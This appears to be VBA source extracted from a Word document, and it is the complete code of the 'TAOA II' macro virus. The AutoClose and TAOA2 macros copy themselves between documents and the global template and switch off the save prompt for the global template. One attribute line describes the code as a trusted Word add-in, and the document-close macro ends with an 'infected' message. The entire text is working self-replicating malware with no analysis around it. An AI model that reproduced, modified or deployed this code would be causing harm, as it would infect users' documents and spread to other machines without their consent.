   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim m$
   m$ = WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy "Global:TAOA2", m$
   m$ = WordBasic.[FileName$]() + ":TAOA2"
   WordBasic.MacroCopy "Global:AutoClose", m$
   WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
   WordBasic.MsgBox "You are infected....with TAOA II....!!"
   End Sub

   Attribute VB_Name = "TAOA2"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Version 2 des bewährten Word-Zusatzes."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.TAOA2.MAIN"
   Dim m$
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   m$ = WordBasic.[FileName$]() + ":TAOA2"
   WordBasic.MacroCopy m$, "Global:AutoClose"
   m$ = WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy m$, "Global:TAOA2"
   End Sub
